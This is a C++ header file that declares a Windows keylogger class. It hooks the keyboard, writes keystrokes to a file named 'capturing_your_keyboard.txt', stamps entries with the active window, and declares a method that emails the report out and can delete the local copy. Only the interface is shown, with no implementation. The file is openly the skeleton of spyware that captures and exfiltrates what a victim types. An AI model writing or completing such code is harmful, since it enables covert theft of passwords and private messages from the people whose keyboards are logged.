#pragma once

#include "EmailService.h"
#include "Hook.h"
#include "StringUtilities.h"
#include "CommandParser.h"
#include "KeyBlockService.h"

#include <fstream>
#include <vector>
#include <Psapi.h>
#include <string>
#include <memory>
#include <ctime>
#include <sstream>
#include <codecvt>
#include <locale>

class Keylogger {
public:
	Keylogger();
	void start();
	void stop();
	~Keylogger();

	bool sendEmailReport(std::wstring emailTo, bool deleteLocal);
private:
	const wstring FILENAME = L"capturing_your_keyboard.txt";
	shared_ptr<Hook> hook;
	bool isActive;
	std::wofstream logFile;
	HWND lastActiveWindow;

	void keyboardHandler(const wchar_t* key);
	void addWindowTimeStamps();
};

